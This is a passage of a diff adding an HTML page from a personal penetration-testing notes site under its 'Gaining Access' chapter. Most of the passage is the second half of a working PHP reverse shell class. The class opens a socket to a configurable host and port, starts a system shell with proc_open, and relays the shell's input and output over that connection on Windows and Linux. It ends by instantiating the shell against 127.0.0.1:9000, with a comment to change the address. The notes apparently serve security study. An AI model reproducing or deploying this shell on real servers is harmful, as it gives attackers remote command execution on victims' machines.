+<span id="cb173-73"><a href="windows-specific.html#cb173-73"></a>        <span class="kw">if</span> <span class="ot">((</span><span class="kw">$bytes</span> = <span class="er">@</span><span class="fu">fwrite</span><span class="ot">(</span><span class="kw">$stream</span><span class="ot">,</span> <span class="kw">$data</span><span class="ot">))</span> === <span class="kw">false</span><span class="ot">)</span> { <span class="co">// suppress an error when writing to a closed blocking stream</span></span>
+<span id="cb173-74"><a href="windows-specific.html#cb173-74"></a>            <span class="kw">$this</span>-&gt;<span class="kw">error</span> = <span class="kw">true</span><span class="ot">;</span>                            <span class="co">// set global error flag</span></span>
+<span id="cb173-75"><a href="windows-specific.html#cb173-75"></a>            <span class="kw">echo</span> <span class="st">&quot;STRM_ERROR: Cannot write to </span><span class="kw">${name}</span><span class="st">, script will now exit...</span><span class="kw">\n</span><span class="st">&quot;</span><span class="ot">;</span></span>
+<span id="cb173-76"><a href="windows-specific.html#cb173-76"></a>        }</span>
+<span id="cb173-77"><a href="windows-specific.html#cb173-77"></a>        <span class="kw">return</span> <span class="kw">$bytes</span><span class="ot">;</span></span>
+<span id="cb173-78"><a href="windows-specific.html#cb173-78"></a>    }</span>
+<span id="cb173-79"><a href="windows-specific.html#cb173-79"></a>    <span class="co">// read/write method for non-blocking streams</span></span>
+<span id="cb173-80"><a href="windows-specific.html#cb173-80"></a>    <span class="kw">private</span> <span class="kw">function</span> rw<span class="ot">(</span><span class="kw">$input</span><span class="ot">,</span> <span class="kw">$output</span><span class="ot">,</span> <span class="kw">$iname</span><span class="ot">,</span> <span class="kw">$oname</span><span class="ot">)</span> {</span>
+<span id="cb173-81"><a href="windows-specific.html#cb173-81"></a>        <span class="kw">while</span> <span class="ot">((</span><span class="kw">$data</span> = <span class="kw">$this</span>-&gt;read<span class="ot">(</span><span class="kw">$input</span><span class="ot">,</span> <span class="kw">$iname</span><span class="ot">,</span> <span class="kw">$this</span>-&gt;buffer<span class="ot">))</span> &amp;&amp; <span class="kw">$this</span>-&gt;write<span class="ot">(</span><span class="kw">$output</span><span class="ot">,</span> <span class="kw">$oname</span><span class="ot">,</span> <span class="kw">$data</span><span class="ot">))</span> {</span>
+<span id="cb173-82"><a href="windows-specific.html#cb173-82"></a>            <span class="kw">if</span> <span class="ot">(</span><span class="kw">$this</span>-&gt;os === <span class="st">&#39;WINDOWS&#39;</span> &amp;&amp; <span class="kw">$oname</span> === <span class="st">&#39;STDIN&#39;</span><span class="ot">)</span> { <span class="kw">$this</span>-&gt;clen += <span class="fu">strlen</span><span class="ot">(</span><span class="kw">$data</span><span class="ot">);</span> } <span class="co">// calculate the command length</span></span>
+<span id="cb173-83"><a href="windows-specific.html#cb173-83"></a>            <span class="kw">$this</span>-&gt;dump<span class="ot">(</span><span class="kw">$data</span><span class="ot">);</span> <span class="co">// script&#39;s dump</span></span>
+<span id="cb173-84"><a href="windows-specific.html#cb173-84"></a>        }</span>
+<span id="cb173-85"><a href="windows-specific.html#cb173-85"></a>    }</span>
+<span id="cb173-86"><a href="windows-specific.html#cb173-86"></a>    <span class="co">// read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)</span></span>
+<span id="cb173-87"><a href="windows-specific.html#cb173-87"></a>    <span class="co">// we must read the exact byte length from a stream and not a single byte more</span></span>
+<span id="cb173-88"><a href="windows-specific.html#cb173-88"></a>    <span class="kw">private</span> <span class="kw">function</span> brw<span class="ot">(</span><span class="kw">$input</span><span class="ot">,</span> <span class="kw">$output</span><span class="ot">,</span> <span class="kw">$iname</span><span class="ot">,</span> <span class="kw">$oname</span><span class="ot">)</span> {</span>
+<span id="cb173-89"><a href="windows-specific.html#cb173-89"></a>        <span class="kw">$fstat</span> = <span class="fu">fstat</span><span class="ot">(</span><span class="kw">$input</span><span class="ot">);</span></span>
+<span id="cb173-90"><a href="windows-specific.html#cb173-90"></a>        <span class="kw">$size</span> = <span class="kw">$fstat</span><span class="ot">[</span><span class="st">&#39;size&#39;</span><span class="ot">];</span></span>
+<span id="cb173-91"><a href="windows-specific.html#cb173-91"></a>        <span class="kw">if</span> <span class="ot">(</span><span class="kw">$this</span>-&gt;os === <span class="st">&#39;WINDOWS&#39;</span> &amp;&amp; <span class="kw">$iname</span> === <span class="st">&#39;STDOUT&#39;</span> &amp;&amp; <span class="kw">$this</span>-&gt;clen<span class="ot">)</span> {</span>
+<span id="cb173-92"><a href="windows-specific.html#cb173-92"></a>            <span class="co">// for some reason Windows OS pipes STDIN into STDOUT</span></span>
+<span id="cb173-93"><a href="windows-specific.html#cb173-93"></a>            <span class="co">// we do not like that</span></span>
+<span id="cb173-94"><a href="windows-specific.html#cb173-94"></a>            <span class="co">// we need to discard the data from the stream</span></span>
+<span id="cb173-95"><a href="windows-specific.html#cb173-95"></a>            <span class="kw">while</span> <span class="ot">(</span><span class="kw">$this</span>-&gt;clen &gt; <span class="dv">0</span> &amp;&amp; <span class="ot">(</span><span class="kw">$bytes</span> = <span class="kw">$this</span>-&gt;clen &gt;= <span class="kw">$this</span>-&gt;buffer <span class="ot">?</span> <span class="kw">$this</span>-&gt;buffer <span class="ot">:</span> <span class="kw">$this</span>-&gt;clen<span class="ot">)</span> &amp;&amp; <span class="kw">$this</span>-&gt;read<span class="ot">(</span><span class="kw">$input</span><span class="ot">,</span> <span class="kw">$iname</span><span class="ot">,</span> <span class="kw">$bytes</span><span class="ot">))</span> {</span>
+<span id="cb173-96"><a href="windows-specific.html#cb173-96"></a>                <span class="kw">$this</span>-&gt;clen -= <span class="kw">$bytes</span><span class="ot">;</span></span>
+<span id="cb173-97"><a href="windows-specific.html#cb173-97"></a>                <span class="kw">$size</span> -= <span class="kw">$bytes</span><span class="ot">;</span></span>
+<span id="cb173-98"><a href="windows-specific.html#cb173-98"></a>            }</span>
+<span id="cb173-99"><a href="windows-specific.html#cb173-99"></a>        }</span>
+<span id="cb173-100"><a href="windows-specific.html#cb173-100"></a>        <span class="kw">while</span> <span class="ot">(</span><span class="kw">$size</span> &gt; <span class="dv">0</span> &amp;&amp; <span class="ot">(</span><span class="kw">$bytes</span> = <span class="kw">$size</span> &gt;= <span class="kw">$this</span>-&gt;buffer <span class="ot">?</span> <span class="kw">$this</span>-&gt;buffer <span class="ot">:</span> <span class="kw">$size</span><span class="ot">)</span> &amp;&amp; <span class="ot">(</span><span class="kw">$data</span> = <span class="kw">$this</span>-&gt;read<span class="ot">(</span><span class="kw">$input</span><span class="ot">,</span> <span class="kw">$iname</span><span class="ot">,</span> <span class="kw">$bytes</span><span class="ot">))</span> &amp;&amp; <span class="kw">$this</span>-&gt;write<span class="ot">(</span><span class="kw">$output</span><span class="ot">,</span> <span class="kw">$oname</span><span class="ot">,</span> <span class="kw">$data</span><span class="ot">))</span> {</span>
+<span id="cb173-101"><a href="windows-specific.html#cb173-101"></a>            <span class="kw">$size</span> -= <span class="kw">$bytes</span><span class="ot">;</span></span>
+<span id="cb173-102"><a href="windows-specific.html#cb173-102"></a>            <span class="kw">$this</span>-&gt;dump<span class="ot">(</span><span class="kw">$data</span><span class="ot">);</span> <span class="co">// script&#39;s dump</span></span>
+<span id="cb173-103"><a href="windows-specific.html#cb173-103"></a>        }</span>
+<span id="cb173-104"><a href="windows-specific.html#cb173-104"></a>    }</span>
+<span id="cb173-105"><a href="windows-specific.html#cb173-105"></a>    <span class="kw">public</span> <span class="kw">function</span> run<span class="ot">()</span> {</span>
+<span id="cb173-106"><a href="windows-specific.html#cb173-106"></a>        <span class="kw">if</span> <span class="ot">(</span><span class="kw">$this</span>-&gt;detect<span class="ot">()</span> &amp;&amp; !<span class="kw">$this</span>-&gt;daemonize<span class="ot">())</span> {</span>
+<span id="cb173-107"><a href="windows-specific.html#cb173-107"></a>            <span class="kw">$this</span>-&gt;settings<span class="ot">();</span></span>
+<span id="cb173-108"><a href="windows-specific.html#cb173-108"></a></span>
+<span id="cb173-109"><a href="windows-specific.html#cb173-109"></a>            <span class="co">// ----- SOCKET </span><span class="re">BEGIN</span><span class="co"> -----</span></span>
+<span id="cb173-110"><a href="windows-specific.html#cb173-110"></a>            <span class="kw">$socket</span> = <span class="er">@</span><span class="fu">fsockopen</span><span class="ot">(</span><span class="kw">$this</span>-&gt;addr<span class="ot">,</span> <span class="kw">$this</span>-&gt;port<span class="ot">,</span> <span class="kw">$errno</span><span class="ot">,</span> <span class="kw">$errstr</span><span class="ot">,</span> <span class="dv">30</span><span class="ot">);</span></span>
+<span id="cb173-111"><a href="windows-specific.html#cb173-111"></a>            <span class="kw">if</span> <span class="ot">(</span>!<span class="kw">$socket</span><span class="ot">)</span> {</span>
+<span id="cb173-112"><a href="windows-specific.html#cb173-112"></a>                <span class="kw">echo</span> <span class="st">&quot;SOC_ERROR: </span><span class="kw">{$errno}</span><span class="st">: </span><span class="kw">{$errstr}\n</span><span class="st">&quot;</span><span class="ot">;</span></span>
+<span id="cb173-113"><a href="windows-specific.html#cb173-113"></a>            } <span class="kw">else</span> {</span>
+<span id="cb173-114"><a href="windows-specific.html#cb173-114"></a>                <span class="fu">stream_set_blocking</span><span class="ot">(</span><span class="kw">$socket</span><span class="ot">,</span> <span class="kw">false</span><span class="ot">);</span> <span class="co">// set the socket stream to non-blocking mode | returns &#39;true&#39; on Windows OS</span></span>
+<span id="cb173-115"><a href="windows-specific.html#cb173-115"></a></span>
+<span id="cb173-116"><a href="windows-specific.html#cb173-116"></a>                <span class="co">// ----- SHELL </span><span class="re">BEGIN</span><span class="co"> -----</span></span>
+<span id="cb173-117"><a href="windows-specific.html#cb173-117"></a>                <span class="kw">$process</span> = <span class="er">@</span><span class="fu">proc_open</span><span class="ot">(</span><span class="kw">$this</span>-&gt;shell<span class="ot">,</span> <span class="kw">$this</span>-&gt;descriptorspec<span class="ot">,</span> <span class="kw">$pipes</span><span class="ot">,</span> <span class="kw">null</span><span class="ot">,</span> <span class="kw">null</span><span class="ot">);</span></span>
+<span id="cb173-118"><a href="windows-specific.html#cb173-118"></a>                <span class="kw">if</span> <span class="ot">(</span>!<span class="kw">$process</span><span class="ot">)</span> {</span>
+<span id="cb173-119"><a href="windows-specific.html#cb173-119"></a>                    <span class="kw">echo</span> <span class="st">&quot;PROC_ERROR: Cannot start the shell</span><span class="kw">\n</span><span class="st">&quot;</span><span class="ot">;</span></span>
+<span id="cb173-120"><a href="windows-specific.html#cb173-120"></a>                } <span class="kw">else</span> {</span>
+<span id="cb173-121"><a href="windows-specific.html#cb173-121"></a>                    <span class="kw">foreach</span> <span class="ot">(</span><span class="kw">$pipes</span> <span class="kw">as</span> <span class="kw">$pipe</span><span class="ot">)</span> {</span>
+<span id="cb173-122"><a href="windows-specific.html#cb173-122"></a>                        <span class="fu">stream_set_blocking</span><span class="ot">(</span><span class="kw">$pipe</span><span class="ot">,</span> <span class="kw">false</span><span class="ot">);</span> <span class="co">// set the shell streams to non-blocking mode | returns &#39;false&#39; on Windows OS</span></span>
+<span id="cb173-123"><a href="windows-specific.html#cb173-123"></a>                    }</span>
+<span id="cb173-124"><a href="windows-specific.html#cb173-124"></a></span>
+<span id="cb173-125"><a href="windows-specific.html#cb173-125"></a>                    <span class="co">// ----- WORK </span><span class="re">BEGIN</span><span class="co"> -----</span></span>
+<span id="cb173-126"><a href="windows-specific.html#cb173-126"></a>                    <span class="kw">$status</span> = <span class="fu">proc_get_status</span><span class="ot">(</span><span class="kw">$process</span><span class="ot">);</span></span>
+<span id="cb173-127"><a href="windows-specific.html#cb173-127"></a>                    <span class="er">@</span><span class="fu">fwrite</span><span class="ot">(</span><span class="kw">$socket</span><span class="ot">,</span> <span class="st">&quot;SOCKET: Shell has connected! PID: &quot;</span> . <span class="kw">$status</span><span class="ot">[</span><span class="st">&#39;pid&#39;</span><span class="ot">]</span> . <span class="st">&quot;</span><span class="kw">\n</span><span class="st">&quot;</span><span class="ot">);</span></span>
+<span id="cb173-128"><a href="windows-specific.html#cb173-128"></a>                    <span class="kw">do</span> {</span>
+<span id="cb173-129"><a href="windows-specific.html#cb173-129"></a>                        <span class="kw">$status</span> = <span class="fu">proc_get_status</span><span class="ot">(</span><span class="kw">$process</span><span class="ot">);</span></span>
+<span id="cb173-130"><a href="windows-specific.html#cb173-130"></a>                        <span class="kw">if</span> <span class="ot">(</span><span class="fu">feof</span><span class="ot">(</span><span class="kw">$socket</span><span class="ot">))</span> { <span class="co">// check for end-of-file on SOCKET</span></span>
+<span id="cb173-131"><a href="windows-specific.html#cb173-131"></a>                            <span class="kw">echo</span> <span class="st">&quot;SOC_ERROR: Shell connection has been terminated</span><span class="kw">\n</span><span class="st">&quot;</span><span class="ot">;</span> <span class="kw">break</span><span class="ot">;</span></span>
+<span id="cb173-132"><a href="windows-specific.html#cb173-132"></a>                        } <span class="kw">else</span> <span class="kw">if</span> <span class="ot">(</span><span class="fu">feof</span><span class="ot">(</span><span class="kw">$pipes</span><span class="ot">[</span><span class="dv">1</span><span class="ot">])</span> || !<span class="kw">$status</span><span class="ot">[</span><span class="st">&#39;running&#39;</span><span class="ot">])</span> {                 <span class="co">// check for end-of-file on STDOUT or if process is still running</span></span>
+<span id="cb173-133"><a href="windows-specific.html#cb173-133"></a>                            <span class="kw">echo</span> <span class="st">&quot;PROC_ERROR: Shell process has been terminated</span><span class="kw">\n</span><span class="st">&quot;</span><span class="ot">;</span>   <span class="kw">break</span><span class="ot">;</span> <span class="co">// feof() does not work with blocking streams</span></span>
+<span id="cb173-134"><a href="windows-specific.html#cb173-134"></a>                        }                                                                    <span class="co">// use proc_get_status() instead</span></span>
+<span id="cb173-135"><a href="windows-specific.html#cb173-135"></a>                        <span class="kw">$streams</span> = <span class="kw">array</span><span class="ot">(</span></span>
+<span id="cb173-136"><a href="windows-specific.html#cb173-136"></a>                            <span class="st">&#39;read&#39;</span>   =&gt; <span class="kw">array</span><span class="ot">(</span><span class="kw">$socket</span><span class="ot">,</span> <span class="kw">$pipes</span><span class="ot">[</span><span class="dv">1</span><span class="ot">],</span> <span class="kw">$pipes</span><span class="ot">[</span><span class="dv">2</span><span class="ot">]),</span> <span class="co">// SOCKET | STDOUT | STDERR</span></span>
+<span id="cb173-137"><a href="windows-specific.html#cb173-137"></a>                            <span class="st">&#39;write&#39;</span>  =&gt; <span class="kw">null</span><span class="ot">,</span></span>
+<span id="cb173-138"><a href="windows-specific.html#cb173-138"></a>                            <span class="st">&#39;except&#39;</span> =&gt; <span class="kw">null</span></span>
+<span id="cb173-139"><a href="windows-specific.html#cb173-139"></a>                        <span class="ot">);</span></span>
+<span id="cb173-140"><a href="windows-specific.html#cb173-140"></a>                        <span class="kw">$num_changed_streams</span> = <span class="er">@</span><span class="fu">stream_select</span><span class="ot">(</span><span class="kw">$streams</span><span class="ot">[</span><span class="st">&#39;read&#39;</span><span class="ot">],</span> <span class="kw">$streams</span><span class="ot">[</span><span class="st">&#39;write&#39;</span><span class="ot">],</span> <span class="kw">$streams</span><span class="ot">[</span><span class="st">&#39;except&#39;</span><span class="ot">],</span> <span class="dv">0</span><span class="ot">);</span> <span class="co">// wait for stream changes | will not wait on Windows OS</span></span>
+<span id="cb173-141"><a href="windows-specific.html#cb173-141"></a>                        <span class="kw">if</span> <span class="ot">(</span><span class="kw">$num_changed_streams</span> === <span class="kw">false</span><span class="ot">)</span> {</span>
+<span id="cb173-142"><a href="windows-specific.html#cb173-142"></a>                            <span class="kw">echo</span> <span class="st">&quot;STRM_ERROR: stream_select() failed</span><span class="kw">\n</span><span class="st">&quot;</span><span class="ot">;</span> <span class="kw">break</span><span class="ot">;</span></span>
+<span id="cb173-143"><a href="windows-specific.html#cb173-143"></a>                        } <span class="kw">else</span> <span class="kw">if</span> <span class="ot">(</span><span class="kw">$num_changed_streams</span> &gt; <span class="dv">0</span><span class="ot">)</span> {</span>
+<span id="cb173-144"><a href="windows-specific.html#cb173-144"></a>                            <span class="kw">if</span> <span class="ot">(</span><span class="kw">$this</span>-&gt;os === <span class="st">&#39;LINUX&#39;</span><span class="ot">)</span> {</span>
+<span id="cb173-145"><a href="windows-specific.html#cb173-145"></a>                                <span class="kw">if</span> <span class="ot">(</span><span class="fu">in_array</span><span class="ot">(</span><span class="kw">$socket</span>  <span class="ot">,</span> <span class="kw">$streams</span><span class="ot">[</span><span class="st">&#39;read&#39;</span><span class="ot">]))</span> { <span class="kw">$this</span>-&gt;rw<span class="ot">(</span><span class="kw">$socket</span>  <span class="ot">,</span> <span class="kw">$pipes</span><span class="ot">[</span><span class="dv">0</span><span class="ot">],</span> <span class="st">&#39;SOCKET&#39;</span><span class="ot">,</span> <span class="st">&#39;STDIN&#39;</span> <span class="ot">);</span> } <span class="co">// read from SOCKET and write to STDIN</span></span>
+<span id="cb173-146"><a href="windows-specific.html#cb173-146"></a>                                <span class="kw">if</span> <span class="ot">(</span><span class="fu">in_array</span><span class="ot">(</span><span class="kw">$pipes</span><span class="ot">[</span><span class="dv">2</span><span class="ot">],</span> <span class="kw">$streams</span><span class="ot">[</span><span class="st">&#39;read&#39;</span><span class="ot">]))</span> { <span class="kw">$this</span>-&gt;rw<span class="ot">(</span><span class="kw">$pipes</span><span class="ot">[</span><span class="dv">2</span><span class="ot">],</span> <span class="kw">$socket</span>  <span class="ot">,</span> <span class="st">&#39;STDERR&#39;</span><span class="ot">,</span> <span class="st">&#39;SOCKET&#39;</span><span class="ot">);</span> } <span class="co">// read from STDERR and write to SOCKET</span></span>
+<span id="cb173-147"><a href="windows-specific.html#cb173-147"></a>                                <span class="kw">if</span> <span class="ot">(</span><span class="fu">in_array</span><span class="ot">(</span><span class="kw">$pipes</span><span class="ot">[</span><span class="dv">1</span><span class="ot">],</span> <span class="kw">$streams</span><span class="ot">[</span><span class="st">&#39;read&#39;</span><span class="ot">]))</span> { <span class="kw">$this</span>-&gt;rw<span class="ot">(</span><span class="kw">$pipes</span><span class="ot">[</span><span class="dv">1</span><span class="ot">],</span> <span class="kw">$socket</span>  <span class="ot">,</span> <span class="st">&#39;STDOUT&#39;</span><span class="ot">,</span> <span class="st">&#39;SOCKET&#39;</span><span class="ot">);</span> } <span class="co">// read from STDOUT and write to SOCKET</span></span>
+<span id="cb173-148"><a href="windows-specific.html#cb173-148"></a>                            } <span class="kw">else</span> <span class="kw">if</span> <span class="ot">(</span><span class="kw">$this</span>-&gt;os === <span class="st">&#39;WINDOWS&#39;</span><span class="ot">)</span> {</span>
+<span id="cb173-149"><a href="windows-specific.html#cb173-149"></a>                                <span class="co">// order is important</span></span>
+<span id="cb173-150"><a href="windows-specific.html#cb173-150"></a>                                <span class="kw">if</span> <span class="ot">(</span><span class="fu">in_array</span><span class="ot">(</span><span class="kw">$socket</span><span class="ot">,</span> <span class="kw">$streams</span><span class="ot">[</span><span class="st">&#39;read&#39;</span><span class="ot">])</span><span class="co">/*------*/</span><span class="ot">)</span> { <span class="kw">$this</span>-&gt;rw <span class="ot">(</span><span class="kw">$socket</span>  <span class="ot">,</span> <span class="kw">$pipes</span><span class="ot">[</span><span class="dv">0</span><span class="ot">],</span> <span class="st">&#39;SOCKET&#39;</span><span class="ot">,</span> <span class="st">&#39;STDIN&#39;</span> <span class="ot">);</span> } <span class="co">// read from SOCKET and write to STDIN</span></span>
+<span id="cb173-151"><a href="windows-specific.html#cb173-151"></a>                                <span class="kw">if</span> <span class="ot">((</span><span class="kw">$fstat</span> = <span class="fu">fstat</span><span class="ot">(</span><span class="kw">$pipes</span><span class="ot">[</span><span class="dv">2</span><span class="ot">]))</span> &amp;&amp; <span class="kw">$fstat</span><span class="ot">[</span><span class="st">&#39;size&#39;</span><span class="ot">])</span> { <span class="kw">$this</span>-&gt;brw<span class="ot">(</span><span class="kw">$pipes</span><span class="ot">[</span><span class="dv">2</span><span class="ot">],</span> <span class="kw">$socket</span>  <span class="ot">,</span> <span class="st">&#39;STDERR&#39;</span><span class="ot">,</span> <span class="st">&#39;SOCKET&#39;</span><span class="ot">);</span> } <span class="co">// read from STDERR and write to SOCKET</span></span>
+<span id="cb173-152"><a href="windows-specific.html#cb173-152"></a>                                <span class="kw">if</span> <span class="ot">((</span><span class="kw">$fstat</span> = <span class="fu">fstat</span><span class="ot">(</span><span class="kw">$pipes</span><span class="ot">[</span><span class="dv">1</span><span class="ot">]))</span> &amp;&amp; <span class="kw">$fstat</span><span class="ot">[</span><span class="st">&#39;size&#39;</span><span class="ot">])</span> { <span class="kw">$this</span>-&gt;brw<span class="ot">(</span><span class="kw">$pipes</span><span class="ot">[</span><span class="dv">1</span><span class="ot">],</span> <span class="kw">$socket</span>  <span class="ot">,</span> <span class="st">&#39;STDOUT&#39;</span><span class="ot">,</span> <span class="st">&#39;SOCKET&#39;</span><span class="ot">);</span> } <span class="co">// read from STDOUT and write to SOCKET</span></span>
+<span id="cb173-153"><a href="windows-specific.html#cb173-153"></a>                            }</span>
+<span id="cb173-154"><a href="windows-specific.html#cb173-154"></a>                        }</span>
+<span id="cb173-155"><a href="windows-specific.html#cb173-155"></a>                    } <span class="kw">while</span> <span class="ot">(</span>!<span class="kw">$this</span>-&gt;<span class="kw">error</span><span class="ot">);</span></span>
+<span id="cb173-156"><a href="windows-specific.html#cb173-156"></a>                    <span class="co">// ------ WORK </span><span class="re">END</span><span class="co"> ------</span></span>
+<span id="cb173-157"><a href="windows-specific.html#cb173-157"></a></span>
+<span id="cb173-158"><a href="windows-specific.html#cb173-158"></a>                    <span class="kw">foreach</span> <span class="ot">(</span><span class="kw">$pipes</span> <span class="kw">as</span> <span class="kw">$pipe</span><span class="ot">)</span> {</span>
+<span id="cb173-159"><a href="windows-specific.html#cb173-159"></a>                        <span class="fu">fclose</span><span class="ot">(</span><span class="kw">$pipe</span><span class="ot">);</span></span>
+<span id="cb173-160"><a href="windows-specific.html#cb173-160"></a>                    }</span>
+<span id="cb173-161"><a href="windows-specific.html#cb173-161"></a>                    <span class="fu">proc_close</span><span class="ot">(</span><span class="kw">$process</span><span class="ot">);</span></span>
+<span id="cb173-162"><a href="windows-specific.html#cb173-162"></a>                }</span>
+<span id="cb173-163"><a href="windows-specific.html#cb173-163"></a>                <span class="co">// ------ SHELL </span><span class="re">END</span><span class="co"> ------</span></span>
+<span id="cb173-164"><a href="windows-specific.html#cb173-164"></a></span>
+<span id="cb173-165"><a href="windows-specific.html#cb173-165"></a>                <span class="fu">fclose</span><span class="ot">(</span><span class="kw">$socket</span><span class="ot">);</span></span>
+<span id="cb173-166"><a href="windows-specific.html#cb173-166"></a>            }</span>
+<span id="cb173-167"><a href="windows-specific.html#cb173-167"></a>            <span class="co">// ------ SOCKET </span><span class="re">END</span><span class="co"> ------</span></span>
+<span id="cb173-168"><a href="windows-specific.html#cb173-168"></a></span>
+<span id="cb173-169"><a href="windows-specific.html#cb173-169"></a>        }</span>
+<span id="cb173-170"><a href="windows-specific.html#cb173-170"></a>    }</span>
+<span id="cb173-171"><a href="windows-specific.html#cb173-171"></a>}</span>
+<span id="cb173-172"><a href="windows-specific.html#cb173-172"></a><span class="kw">echo</span> <span class="st">&#39;&lt;pre&gt;&#39;</span><span class="ot">;</span></span>
+<span id="cb173-173"><a href="windows-specific.html#cb173-173"></a><span class="co">// change the host address and/or port number as necessary</span></span>
+<span id="cb173-174"><a href="windows-specific.html#cb173-174"></a><span class="kw">$sh</span> = <span class="kw">new</span> Shell<span class="ot">(</span><span class="st">&#39;127.0.0.1&#39;</span><span class="ot">,</span> <span class="dv">9000</span><span class="ot">);</span></span>
+<span id="cb173-175"><a href="windows-specific.html#cb173-175"></a><span class="kw">$sh</span>-&gt;run<span class="ot">();</span></span>
+<span id="cb173-176"><a href="windows-specific.html#cb173-176"></a><span class="kw">unset</span><span class="ot">(</span><span class="kw">$sh</span><span class="ot">);</span></span>
+<span id="cb173-177"><a href="windows-specific.html#cb173-177"></a><span class="co">// garbage collector requires PHP v5.3.0 or greater</span></span>
+<span id="cb173-178"><a href="windows-specific.html#cb173-178"></a><span class="co">// @gc_collect_cycles();</span></span>
+<span id="cb173-179"><a href="windows-specific.html#cb173-179"></a><span class="kw">echo</span> <span class="st">&#39;&lt;/pre&gt;&#39;</span><span class="ot">;</span></span>
+<span id="cb173-180"><a href="windows-specific.html#cb173-180"></a><span class="kw">?&gt;</span></span></code></pre></div>
+
+</div>
+</div>
+</div>
+
+
+
+<div class="page-inner">
+    <section class="normal" id="section-">
+        <div class="copyright">
+          &copy; 2021 - Lo0pInG 404 <a href="https://michellopez.org">[michellopez.org]</a>
+        </div>
+    </section>
+</div>
+            </section>
+
+          </div>
+        </div>
+      </div>
+<a href="gaining-access-with-metasploit.html" class="navigation navigation-prev " aria-label="Previous page"><i class="fa fa-angle-left"></i></a>
+<a href="linux-machine.html" class="navigation navigation-next " aria-label="Next page"><i class="fa fa-angle-right"></i></a>
+    </div>
+  </div>
+<script src="libs/gitbook-2.6.7/js/app.min.js"></script>
+<script src="libs/gitbook-2.6.7/js/lunr.js"></script>
+<script src="libs/gitbook-2.6.7/js/clipboard.min.js"></script>
+<script src="libs/gitbook-2.6.7/js/plugin-search.js"></script>
+<script src="libs/gitbook-2.6.7/js/plugin-sharing.js"></script>
+<script src="libs/gitbook-2.6.7/js/plugin-fontsettings.js"></script>
+<script src="libs/gitbook-2.6.7/js/plugin-bookdown.js"></script>
+<script src="libs/gitbook-2.6.7/js/jquery.highlight.js"></script>
+<script src="libs/gitbook-2.6.7/js/plugin-clipboard.js"></script>
+<script>
+gitbook.require(["gitbook"], function(gitbook) {
+gitbook.start({
+"sharing": false,
+"fontsettings": {
+"theme": "night",
+"family": "sans",
+"size": 2
+},
+"edit": {
+"link": "https://github.com/mlopez66/hacking-notes/edit/master/04-Gaining-Access/04-04-windows.Rmd",
+"text": "Edit"
+},
+"history": {
+"link": null,
+"text": null
+},
+"view": {
+"link": null,
+"text": null
+},
+"download": ["2021-Hacking-Notes.pdf"],
+"toc": {
+"collapse": "section",
+"scroll_highlight": true
+}
+});
+});
+</script>
+
+</body>
+
+</html>
